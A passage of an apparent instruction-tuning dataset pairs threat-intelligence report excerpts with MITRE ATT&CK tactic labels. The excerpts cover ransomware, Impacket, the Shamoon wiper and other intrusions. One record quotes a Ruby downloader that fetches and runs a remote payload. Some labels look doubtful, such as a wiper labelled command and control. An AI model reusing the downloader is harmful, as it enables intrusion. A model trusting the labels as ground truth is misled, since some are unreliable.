        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Spam Email\nDuring the first two days, Emotet sent outbound spam emails over SMTP:\nThe following is an example of the SMTP traffic for sending the email, along with an extracted EML that was sent with an attached XLS:\nRansomware\nTowards the last day of the intrusion, the threat actor made their preparations to deploy ransomware to the domain. They started by connecting to a new server via RDP from the server they just usedTactical RMMto deploy Anydesk. Once establishing the RDP connection, they deployedPowertool64.exe,likely to prevent intervention by any security tools and launched the softwareDon't Sleep.\nDon't Sleep has the capability to keep the computer from being shutdown and the user from being signed off. This was likely done to ensure nothing will interfere with the propagation of the ransomware payload.\nFinally, with Don't Sleep running, the threat actor executed a batch script named \"1.bat\". The script invoked the main ransomware payload, locker.dll, and passed a list of all the computers in the domain to the target parameter.\nThe executable began to encrypt all the targeted hosts in the environment and dropped a ransom note:README_TO_DECRYPT.html\nAfter the invocation of the ransomware payload, about a minute later, the threat actor launched Process Hacker. We believe this was to monitor the execution of the ransomware payload.\nAll systems in the domain were encrypted and presented with a ransom message.",
        "output": "impact",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Unit 42 researchers observed Royal threat actors using Rclone, a legitimate tool to manage files between two systems, for exfiltrating stolen data before the deployment of ransomware. We found Rclone deployed in folders such as ProgramData, or renamed and masquerading in other folders. One popular filename used wassvchost.exe.",
        "output": "exfiltration",
        "source": "Palo"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: In the next attack stage, the threat actors established a cmd shell viaExtended SQL Stored Procedure(xp_cmdshell). This process allows you to issue operating system commands directly to the Windows command shell using T-SQL code. An example of command execution following a successful authentication to SQL database using xp_cmdshell:\nAt a high level, the overall execution events can be depicted in the below diagram:\nIf we look into the Windows Application logs, specifically, the SQL Server event ID 15457, captures this as an 'xp_cmdshell' event. Additionally, the SQL Server audit collection also captures similar events. The first commands executed by the threat actors included using taskkill for various anti-virus software.\nThe threat actors also favored the execution of batch scripts on the compromised host. They used xp_cmdshell to write a batch script (1.bat) to disk by redirecting strings to the file using echo commands.\nA second set of commands were also echoed into a file named bigfile.txt.Once complete, certutil was used to decode the text and create an executable file.\nThis executable was then used in executing the 1.bat batch file.\nPulling the hash of the file that was written, matches what appears to be a privilege escalation tool as seen in the hits from THOR scanner:https://www.virustotal.com/gui/file/b67dfd4a818d10a017a4d32386cf4cd2a3974636bed04f27e45de6ada86a56d2/community\nWe believe this tool may be a variation ofNetworkServiceExploit.exe, which attempts to use NetworkService for privilege escalation.\nAdditionally, we noticed the attackers dropping a file named \"xitmf\". Looking into the file's content, we noticed that the header began with \"FOMB\". When flipping the header, it spells BMOF, which indicates a Binary Managed Object Format file. BMOF is a compiled version of a Managed Object Format (MOF) file.As per Microsoft's official documentation:\nMOF files are compiled using the Windows compiler tool mofcomp.Mofcomp.exeis also used to execute scripts by parsing the MOF statements and creates new classes as part of the WMI repository.\nUsing the same mofcomp utility, its possible to decompile the BMOF to extract the script, using this command provided by Matt Graeber:\nThreat actors also transferred a Visual Basic Encoded (VBE) file that is executed on the host using cscript.exe. Once run, the script would set up and execute the XMRig CoinMiner. During the execution, the password579562847is provided as an argument.\nWe recognize that this is a VBE file from the file signature (\"magic bytes\") at the first four bytes of the top of the file.\nWe can decode the VBE file using CyberChef:\nThe script has several functions, one to control the coin miner software on the host, and two, to configure the parameters such as user-agent strings through randomization:\nCommand interactions are done via WMI, for process discovery:\nProcess creation:\nIn the code, we observed further attempts to obfuscate sensitive attributable values:\nUsing the original password and some further de-obfuscation, we could decipher the values, in this case, the email address is:\nbj87670@gmail.com\nSome other deciphered values relate to coin mining pools:\nWe also observed another dropper. Threat actors transferred the file ex.exe. Ex.exe is an Unrar application that they used to extract more malicious artifacts:\nCommandLine:\nFile Extracted:\nThe kit.bat script included instructions for executing the miner as well as for creating persistence via a schedule task. See the contents of the script below:\nSomething to note here, regarding the kit.bat script, is that we discovered that its contents were the topic of discussion in a Chinese forum back in 2018.\nLink: hxxp://www[.]bathome[.]net/thread-48526-1-1.html",
        "output": "execution",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Qbot used various information stealing modules to extract sensitive information from the beachhead host.\nOutlook was started, possibly to steal e-mail messages. However, we could not find evidence to conclusively support this.\nQbot also used the Windows built-in utilityesentutl.exeto extract browser data from Internet Explorer and Microsoft Edge:\nOn a file server, we observed the threat actor manually inspecting files using various built-in viewers. For example, for viewing PDF files, Internet Explorer was used to view these files. For DOCX files, WordPad was used.\nAn indication that these files were viewed locally on the network, was the presence of the 'OpenWith' process:",
        "output": "collection",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The threat actors dropped and executed multiple payloads reaching out to different C2s. The graph below shows how the threat actors were able to pivot between C2s by either injecting into legitimate processes or dropping and executing new payloads.\nLike in our previousBumbleBee report, we see the use of injection into a legitimate Windows executable.\nAnd likewise, we see BumbleBee spawning these new processes using WmiPrvSE.exe.\nThe graphic below shows all payloads dropped, executed, or injected by the threat actors. Both Meterpreter and Cobalt Strike payloads were used during this intrusion.",
        "output": "execution",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Although we observed a suspiciously large number of documents opened and screenshots taken from one of the compromised systems, we did not identify techniques used to exfiltrate data from the network. It is possible that document exfiltration is carried out by the execution of upload/download commands similar to the ones listed above. ",
        "output": "exfiltration",
        "source": "Cisco"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The more_eggs malware was the most predominate command and control traffic until the threat actor deployed Cobalt Strike to the network which was significantly higher. As highlighted in the graph below, the Pyramid C2 was only used once.\nmore_eggs\nThe more_eggs payload communicated with the following command and control address:\nThis IP address has been tracked by the DFIRThreat Intelligence Groupas active since mid March 2024 through November 2024.\nCobalt Strike\nThe full beacon configuration was not recoverable however a partial configuration was picked up during a memory scan across the environment:\nThis IP and domain were only seen active during March 2024 and the DFIRThreat Intelligence Groupalso observed the domain associated with the IP 109.104.152.24, although that address was not observed in this intrusion.\nCloudFlare Tunnels\nCloudFlared tunnels were established on two server hosts by the threat actor. One host showed persistent connections to the CloudFlare IPv4 range during the intrusion.\nWith DNS query requests to the following domains:\nDeploying Pyramid C2\nThe threat actor transferred the file python-3.10.4-embed-amd64.zip through the Cobalt Strike beacon. This zip file included a number of files, including an exploit tool for Veeam. This was dropped on the beachhead in the user writable 'ProgramData' folder.\nThe zip file was masqueraded as a Python-3.10 install package. The attacker attempted to extract the zip file contents file via PowerShell commandlets, several combinations were attempted, this ultimately failed.\nThe threat actor decided to use the Windows provided utility 'Tar' instead.\nUsing the Tar utility, no target destination was specified by the threat actor. As a result by default the extraction created >200 files in the Windows\\System32.\nUndeterred, the threat actor used the 7zip command line utility that they downloaded in the ProgramData folder.\nUnfortunately, the threat actor made a similar error, with files (> 200) extracted to the Windows\\SysWOW64 folder location this time. This was due to their command session current directory being under C:\\Windows\\System32, with the application being 32-bit (SysWOW64).\nThe threat actor realized the error and switched to the correct current directory of C:\\ProgramData\\SSH. They used 7za again to extract the contents (> 200 files) into the correct location.\nA lot of file creation events were observed throughout this process (>700 files), with python files (.py extension) being created in Windows folder locations that could be unusual.\nOnce finally uncompressed, the threat actor ran the following python file:\nWhen analyzing the file crade.py and decoding its content, we identified it was a Pyramid beacon with the following configuration:\nThe IP address used for this C2 framework has been spotted sporadically by the DFIRThreat Intelligence Groupwith activity in March, July, and September of 2024.",
        "output": "command and control",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Talos discovered the C2 server operated in this campaign with the IP address 185[.]225[.]73[.]238 running on Ubuntu Linux version 18.04, located in the Netherlands and is a part of the Alibaba \ncloud infrastructure. \nShodan search results showed us that the C2 server contained two self-signed SSL certificates with the serial numbers 6532815796879806872 and 1657766544761773100, which are valid from July 14, 2022 - July 14, 2023. \nSSL Certificate serial number 6532815796879806827 \nSSL Certificate serial number 1657766544761773100 \nPivoting on the SSL certificates disclosed another Cobalt Strike C2 server with the IP address 43[.]154[.]175[.]230 running on Ubuntu Linux version 18.04 located in Hong Kong, which is also part of Alibaba cloud infrastructure and more likely is operated by the same actor of this campaign. ",
        "output": "command and control",
        "source": "Cisco"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: WMI was used to pivot to a domain controller on the network. The actor leveraged Impacket'swmiexec.pyto execute commands with a semi-interactive shell, most likely using credentials gathered by the previous LSASS access.\nThe commands executed included directory traversal, host discovery, and execution of tools on the DC.\nA breakdown of the parent and child processes invoked:\nThe command can be broken down as follows:\n'Q' indicates turn off echo  no response. \n'C' indicates to stop after command execution. \nThe 127.0.01 and ADMIN$ indicates C:\\Windows. \nOutput is achieved via the parameter '2>&1', to redirect errors and output to one file:\nThis command line closely resembles the code within thewmiexec.pyas part of the Impacket tool maintained by Fortra.\nAs Impacket interacts with remote endpoints via WMI over TCP via DCERPC, its possible to inspect network level packets:\nThe use of Impacket by threat actors has been recently detailed by CISA in alertAA22-277A  Impacket and Exfiltration Tool Used to Steal Sensitive Information from Defense Industrial Base Organization.\nThe Impacket process hierarchy in this case can be visualized as:\nAt the network level, commands are issued by DCOM/RPC port 135, with responses by SMB using port 445. We can observe a number of WMI requests via DCERPC from one endpoint to a target endpoint based on the ports.\nCorrelating the network activity to the host activity confirms that the 'Powershell.exe' process initiated the WMI requests.\nThe destination port is within the ephemeral port range 4915265535, which is for short-lived, time based, communications RFC 6335.\n13Cubed(Richard Davis) also released an amazing resource to investigate Impacket related incidents here:https://www.13cubed.com/downloads/impacket_exec_commands_cheat_sheet_poster.pdf\nOne of the observed commands invoked via WMI was 'firefox.exe'.\nThis was dropped on the DC and spawned a number of processes and invoked a number of hands-on commands.\nThe process generated a significant volume of network connections to 193.201.9[.]199, averaging ~6K requests per hour, equating to >150K connections throughout the duration of the intrusion.\nRDP was also used by the threat actor on the final two days of the intrusion to connect to various hosts from a domain controller proxying the traffic via the firefox.exe Cobalt Strike beacon.",
        "output": "lateral movement",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Throughout the intrusion, RDP was used for lateral movement. The 'Remote Desktop Connection' app (mstsc.exe) was used on the Confluence beachhead to interactively logon to targeted hosts in the environment. The Event ID 4624 logon activity:\nLateral movement with RDP was done to different hosts in swift succession. Starting under one hour after the initial compromise of the beachhead host. All RDP was performed from the beachhead.",
        "output": "lateral movement",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Unit 42 continuously hunts for new and unique malware samples that match known advanced persistent threat (APT) patterns and tactics. On May 19, one such sample was uploaded to VirusTotal, where it received a benign verdict from all 56 vendors that evaluated it. Beyond the obvious detection concerns, we believe this sample is also significant in terms of its malicious payload, command and control (C2), and packaging.\nThe sample contained a malicious payload associated withBrute Ratel C4(BRc4), the newest red-teaming and adversarial attack simulation tool to hit the market. While this capability has managed to stay out of the spotlight and remains less commonly known than itsCobalt Strikebrethren, it is no less sophisticated. Instead, this tool is uniquely dangerous in that it was specifically designed to avoid detection by endpoint detection and response (EDR) and antivirus (AV) capabilities. Its effectiveness at doing so can clearly be witnessed by the aforementioned lack of detection across vendors on VirusTotal.\nIn terms of C2, we found that the sample called home to an Amazon Web Services (AWS) IP address located in the United States over port 443. Further, the X.509 certificate on the listening port was configured to impersonate Microsoft with an organization name of \"Microsoft\" and organization unit of \"Security.\" Additionally, pivoting on the certificate and other artifacts, we identified a total of 41 malicious IP addresses, nine BRc4 samples, and an additional three organizations across North and South America who have been impacted by this tool so far.\nThis unique sample was packaged in a manner consistent with knownAPT29techniques and their recent campaigns, which leveraged well-known cloud storage and online collaboration applications. Specifically, this sample was packaged as a self-contained ISO. Included in the ISO was a Windows shortcut (LNK) file, a malicious payload DLL and a legitimate copy of Microsoft OneDrive Updater. Attempts to execute the benign application from the ISO-mounted folder resulted in the loading of the malicious payload as a dependency through a technique known as DLL search order hijacking. However, while packaging techniques alone are not enough to definitively attribute this sample to APT29, these techniques demonstrate that users of the tool are now applying nation-state tradecraft to deploy BRc4.\nOverall, we believe this research is significant in that it identifies not only a new red team capability that is largely undetectable by most cybersecurity vendors, but more importantly, a capability with a growing user base that we assess is now leveraging nation-state deployment techniques. This blog provides an overview of BRc4, a detailed analysis of the malicious sample, a comparison between the packaging of this sample and a recent APT29 sample, and a list of indicators of compromise (IoCs) that can be used to hunt for this activity.\nWe encourage all security vendors to create protections to detect activity from this tool and all organizations to be on alert for activity from this tool.\nPalo Alto Networks customers receive protections from the threats described in this blog through Threat Prevention, Cortex XDR and WildFire malware analysis.\nFull visualization of the techniques observed, relevant courses of action and indicators of compromise (IoCs) related to this report can be found in theUnit 42 ATOM viewer.",
        "output": "other",
        "source": "Palo"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: LSASS was accessed by an unusual process \"runonce.exe\" on multiple hosts, including a domain controller.\nThe overpass-the hash technique was used to acquire a valid Kerberos ticket for the administrator user.",
        "output": "credential access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Add persistence capabilities to a PowerShell script. \nNew-UserPersistenceOption - Configure user-level persistence options for the Add-Persistence functi New-ElevatedPersistenceOption - Configure elevated persistence options for the Add-Persistence func Add-Persistence - Add persistence capabilities to a script.   \nInstall-SSP - Installs a security support provider (SSP) dll.   \nGet-SecurityPackage - Enumerates all loaded security packages (SSPs). ",
        "output": "persistence",
        "source": "Mitre"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Using the second-stage SOCKS binary, Going Eagle, the attackers tunneled their machine to perform several network-based attacks.\nAt first, they scanned multiple hosts for openRemote Desktop Protocol(RDP) andServer Message Block(SMB) ports, in order to find targets toward which to move laterally. Leveraging password reuse of the local administrator account on several different hosts, the attackers usedImpacket's wmiexecto run discovery commands on multiple machines.\nThis caused the following detectors to be raised:\nIn addition to wmiexec, the attackers used RDP to move laterally through the network. They uploadedPsExecand used it to runtaskmgr.exeas SYSTEM to gather credentials bydumping lsass memory.\nThis was blocked by the Cortex XDR agent as well and raised several other alerts from Cortex XDR Analytics and Cortex XDR BIOCs:\nAt a certain point, the attackers managed to acquire a privileged domain account and tried using it to steal secrets from the domain controller usingImpacket's secretsdump. But their attempts were blocked by the Cortex XDR agent.\nIt seems that the attacker failed to reach their goals and stopped trying to move laterally due to the multiple protections in place.",
        "output": "lateral movement",
        "source": "Palo"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: RDP login as local administrator from 64.86.198[.]22. No brute force attempts were seen from this IP.",
        "output": "initial access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: After running initial discovery commands the threat actor attempted to download an AnyDesk installer from their server using the exploit.\nThe execution of curl failed to download the AnyDesk installer though. This did not stop the threat actor who later successfully downloaded an AnyDesk installer by other means.\nApproximately ten minutes after gaining initial access, the threat actor leveraged the native Windows mshta.exe utility to download and execute a Metasploit stager.\nAs outlined in thelolbasproject, this technique enables the threat actor to drop a payload into the INetCache directory and execute it directly from there, leveraging trusted system utilities to evade detection.\nThe HTA file executes an encoded PowerShell command.\nThe contents of the HTA file:\nThis encoded command spawns another PowerShell process with an obfuscated command line.\nTo deobfuscate the command line, it's necessary to:\nRemove the + symbol, which concatenates strings. \nReplace {0}, {1} and {2} respectively with =, 6 and P. \nBase64 decode the resulting string. \nGzip decompress the base64 decoded string.\nThe result is the following PS script, which performs the following actions:\nGets the pointers to specific Windows API functions:VirtualAlloc(), VirtualProtect(), CreateThread() and WaitForSingleObject(). \nAllocates a new region of memory via VirtualAlloc() with PAGE_EXECUTE_READWRITE (0x40) permissions. \nCopies a base64 decoded Metasploit shellcode into the newly allocated region of memory. \nChanges the protection of the new memory region into PAGE_EXECUTE (0x10). \nCreates a new thread pointing to the start of the new memory region to execute the Metasploit shellcode. \nWaits for the end of the shellcode execution.\nThe Metasploit shellcode can be emulated throughspeakeasyto identify the command and control server.",
        "output": "execution",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: From thexlsbdocument, the following execution chain occurs. Including copying the Windows CertUtil program and using that to collect further Trickbot payloads.\nWe observed a second stage execution using regsvr32 to load a DLL from the user's AppData\\Local\\Temp folder.\nAlmost immediately an outbound IPv4 address lookup was requested via HTTP. This is usually undertaken to identify the compromised environment, and to facilitate C2. The user agent refers to Curl  and used again for another stage of the intrusion.\nOn the beachhead, multiple executables were saved in a temp directory and then pushed into memory by TrickBot process \"wermgr.exe\". The executables were identified as Cobalt Strike and communicated over port 443 to C2 88.80.147[.]101.\nA PowerShell download cradle was then used to execute Cobalt Strike Beacon in memory:",
        "output": "execution",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: To achieve their objectives, the threat actors pivot to multiple systems such as Domain Controllers, Backup Servers and File Shares using various tools/techniques:\nSysinternals PsExec \nPost-Exploitation Framework, Cobalt Strike \nRemote WMI Execution\nSigma Rules\nWMIC:\nSuspicious WMI Execution\nhttps://github.com/SigmaHQ/sigma/blob/8bb3379b6807610d61d29db1d76f5af4840b8208/rules/windows/process_creation/proc_creation_win_susp_wmi_execution.yml\nWMI Remote Command Execution\nhttps://github.com/SigmaHQ/sigma/blob/c5263039ae6e28a09192b4be2af40fea59a06b08/rules/windows/process_creation/proc_creation_win_wmic_remote_command.yml\nPsExec:\nPsExec Tool Execution\nhttps://github.com/SigmaHQ/sigma/blob/master/rules/windows/pipe_created/pipe_created_tool_psexec.yml\nPsExec Tool Execution\nhttps://github.com/SigmaHQ/sigma/blob/master/rules/windows/file_event/file_event_win_tool_psexec.yml\nPSEXEC Custom Named Service Binary\nhttps://github.com/The-DFIR-Report/Sigma-Rules/blob/main/PSEXEC%20Custom%20Named%20Service%20Binary\nCopy to Admin Shares:\nhttps://github.com/SigmaHQ/sigma/blob/master/rules/windows/process_creation/proc_creation_win_susp_copy_lateral_movement.yml\nCobalt Strike:\nCobalt Strike, a Defender's Guide \nCobalt Strike, a Defender's Guide  Part 2",
        "output": "lateral movement",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The communications module used in this attack is rather hobbled, as it was configured without an operational command and control (C2) server to communicate with. The lack of an operational C2 is much like the November 17, 2016 attack that had the IP address \"1.1.1.1\" within its configuration to use as a C2 server. Unlike the non-operational C2 of \"1.1.1.1\" used in the first Shamoon 2 attack, this communications module completely lacked any IP address or domain name for a C2 server within its configuration.\nAlso, in this sample, Disttrack did not save its communications module to the system using the filename \"netinit.exe\" like in the original attack, rather it chose a random name from the following list:\n\u2022 caiaw00e.exe\u2022 sbuvideo.exe\u2022 caiaw00i.exe\u2022 olvume.exe\u2022 usinwb2.exe\u2022 briaw005.exe\u2022 fpwwlwf.exe\u2022 epiaw003.exe\u2022 briaw002.exe\u2022 olvsnap.exe\u2022 dmwaudio.exe\u2022 briaw006.exe\u2022 miWApRpl.exe\u2022 caiaw00b.exe\u2022 lxiaw003.exe\nLastly, the communications module also uses different file names than the original Shamoon 2 attack. Instead of setting a custom \"kill time\" in a file named \"usbvideo324.pnf\" within the \"%WINDOWS%\\inf\" folder, it uses a file name of \"dcT21x400i.pnf\". It also would send the C2 server the contents of a file named \"vsfnp7_6.pnf\" from the folder \"%WINDOWS%\\inf\" instead of \"netimm173.pnf\".\nMuch like the initial attacks, the lack of an operational C2 server suggests that the threat actor's sole intention for carrying out this Shamoon 2 attack was to destroy data and systems. Without an operational C2, the actor would be unable to issue a command to set a custom \"kill time\" when the Disttrack payload would begin wiping systems, which would force the payload to rely on its hardcoded \"kill time\". The hardcoded date suggests that this attack was set to begin wiping systems on November 29, 2016 at 1:30 AM local Saudi Arabia time.\nUnlike the previous Shamoon attacks that occurred on a holiday and over a weekend, this kill time occurred during the work week, as November 29, 2016 was a Tuesday. However, it appears this attack attempted to maximize its impact by occurring very early in the morning before the majority of the organization's staff were on site. This aligns with the Shamoon actors conducting their attacks off-hours to increase the efficacy of the attack by increasing the timeframe of detection and response.\nWhen Disttrack observes the system clock exceeding the \"kill time\", it will save its wiper component to the system using one of the following randomly chosen filenames:\n\u2022 pdwmtphw.exe\u2022 caiaw00a.exe\u2022 sdwprint.exe\u2022 caiaw00d.exe\u2022 kyiaw002.exe\u2022 sdwscdrv.exe\u2022 briaw00a.exe\u2022 saiaw002.exe\u2022 _mvscdsc.exe\u2022 hdvmp32.exe\u2022 _s3wcap32.exe\u2022 hpiaw001.exe\u2022 lxiaw004.exe\u2022 cniaw001.exe\u2022 lxiaw006.exe\u2022 caiaw00f.exe\u2022 newtvsc.exe\nWhen executed, the wiper component will extract a kernel driver from its resource section and decrypt it with a 172-byte XOR key. The wiper saves the kernel driver (SHA256: 5a826b4fa10891cf63aae832fc645ce680a483b915c608ca26cedbb173b1b80a) to the \"Windows\\System32\\Drivers\" folder in a file named \"vdsk911.sys\". The wiper then uses this file to create a kernel driver service named \"vdsk911\", as seen in Figure 2.\nFigure 2 RawDisk kernel driver service created by Disttrack wiper\nThe kernel driver is the 64-bit version of the commercial RawDisk driver by EldoS Corporation, which is the exact same file as the \"drdisk.sys\" driver extracted from the Disttrack 64-bit payload in the 'X509' resource in the first reported Shamoon 2 attack. The Disttrack payload will use this kernel driver to access the master boot record (MBR), partition tables and files and folders on the system to overwrite them with the same image of the deceased Syrian boy as in the previous Shamoon 2 attack.\nDuring our analysis, we again observed the wiper setting the system time to a random date between August 1 and August 20, 2012, as seen in Figure 3. As mentioned in ourprevious blog, the reason the wiper sets the system time to this random date in August 2012 is due to a temporary license key needed to use the RawDisk kernel driver. The temporary license key used in this attack is the exact same as the first attack.\nFigure 3 Wiper changing the system date to a random date in August 2012\nSince our original blog, we've successfully decrypted the license key, which can be seen in Figure 4. The expiration date in the temporary license key is an 8-byte field (highlighted by the orange box) that corresponds to Microsoft'sFILETIME structure, which represents the number of 100-nanosecond intervals since January 1, 1601 (UTC). In the temporary license key used in all of the Shamoon related attacks, the expiration date was set to August 30, 2012 at 8:34:29 UTC, which is the reason the wiper sets the system time to a random day between August 1 and August 20, 2012. Also, we found that the temporary license key was registered to \"binnatova@bsunanotechnology.com\". We are unsure how this email address is involved with Shamoon, as it was likely compromised back in 2012 and used by the actor to obtain the temporary license for RawDisk.\nFigure 4 RawDisk temporary license decrypted showing August 2012 expiration date\nAfter the MBR, partition tables and files are overwritten, the wiper issues the command of \"shutdown -r -f -t 2\" to reboot the system, which is the same command as used in the first Shamoon 2 attack. Figure 5 shows the dialog box that pops up as a result of this command, which will be followed by a system reboot.\nFigure 5 The shutdown dialog box opened just before reboot of a Windows 7 system wiped by Disttrack\nThe purpose of rebooting the system remains the same, as the portions of the hard disk and filesystem needed to successfully boot the system were overwritten with a JPEG image, the system is no longer able to start up. Figure 6 shows the result of this reboot in an analysis virtual machine, as the operating system could no longer be found.\nFigure 6 System unable to find its operating system\nThe operating system fails to load as the MBR is overwritten with a JPEG image. As seen in Figure 7, sector 0 of the physical hard disk, which normally stores the master boot record now contains the beginning of a JPEG file marked by the \"JFIF\" magic bytes in the two orange boxes.\nFigure 7 Hexdump of sector 0 of the physical showing the MBR overwritten with a JPEG file",
        "output": "command and control",
        "source": "Palo"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Initial access was gained by compromising JumpCloud and inserting malicious code into their commands framework. In at least one instance, the malicious code was a lightweight Ruby script that was executed via the JumpCloud agent. The script contained instructions to download and execute a second stage payload. Within 24 hours of gaining \nNorth Korea Leverages SaaS Provider in a Targeted Supply Chain Attack | Mandiant | Google Cloud Blog initial access to systems in the victim environment, the threat actor deployed additional backdoors and established persistence via plists. The initial payloads and second stage backdoors were removed from the system. \nThe directory choices and naming conventions of the Ruby script and second stage payloads indicated the threat actor placed significant priority into masquerading as legitimate files and applications. \nMandiant retrieved the lightweight Ruby script named init.rb  that was deployed to multiple systems: \nrequire 'open-uri'   \nffn $=$ '/usr/local/bin/com.docker.vmnat'   \nFile.open(ffn, 'wb') do |file|   \nfile.write(open('hxxps://primerosauxiliosp   \nend   \nsleep(1)   \nFile.chmod(0755, ffn)   \nfn $=$ '/usr/local/bin/com.docker.vmnat.lock   \nFile.open(fn, 'wb') do |file|   \nfile.write(open('hxxps://primerosauxiliosp   \nend   \nsleep(1)   \nsystem(ffn) \nThe script downloads two files to locations defined by the variables ffn and fn, but only the first file is executed via the system function. The second file could not be identified on the hosts. ",
        "output": "initial access",
        "source": "mandiant"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Performing parameter extraction this way means the adversary doesn't require a password parameter like conventional CHOPPER-style webshells do. This means that all parameter names can be random or chosen to blend in with the target application. ",
        "output": "defense evasion",
        "source": "github_aptNote"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: The first scheduled task installed using the malicious VBA macro, executed a VBS script, which in turn executed a PowerShell script named Script.ps1.\nScript.ps1 contacts the C2 server and executed the base64 commands using temp.ps1.\nEvent 201 from Microsoft-Windows-TaskScheduler/Operational highlights the successful execution of this scheduled task.\nAnother scheduled task namedMicrosoftEdgeUpdateTaskMachineUCwas registered using schtasks.exe on the command line:\nThe scheduled task was then started manually:\nThe scheduled task was designed to execute module.exe and a PowerShell script named readKey.ps1. These components will be explained later in the collection section of this report.",
        "output": "persistence",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: As part of the discovery stage, we observed data being exfiltrated. The data ranged from host discovery, running processes, and user accounts:\nEntire AD forest data  including usernames , DC configuration, and machine enumeration:",
        "output": "exfiltration",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: We observed the threat actor dumping thentds.ditdatabase on two different domain controllers using a batch script, which then executed the command described inhere:\nAs seen in the Defense Evasion section, the actor used theSysinternals tool ProcDump. The threat actor executed a command to identify the PID of the lsass.exe process. This allowed them to target the correct process to dump lsass:\nIt appears this will not work, as there is no directory for thefindcommand, but the actor likely piped it together, as we saw execution oftasklistat the same time:\nThis is likely the result of executing something like the following (tasklist | find /i \"lsas\"):\nUsing the renamed ProcDump utility, the threat actor dumps thelsass.exeprocess, which can be used to get more credential information:",
        "output": "credential access",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
        "input": "Described attack activity: Advanced defense evasion techniques, such as impairing defenses or process injections, were not used during this intrusion. However, the threat actors performed masquerading with many of their tools:\nThey created login.aspx web shell in the same folder as the legitimate OWA login page. \nThey renamed Fast Reverse Proxy to dllhost.exe to remain stealthy \nThey created the Scheduled Task with \"\\Microsoft\\Windows\\Maintenance\\CacheTask\" name to stay un-noticed",
        "output": "defense evasion",
        "source": "DFIR"
    },
    {
        "instruction": "As a cybersecurity threat analyst, map the described attack activity to its corresponding MITRE ATT&CK framework phase. If the activity spans multiple phases, select the most dominant one.",
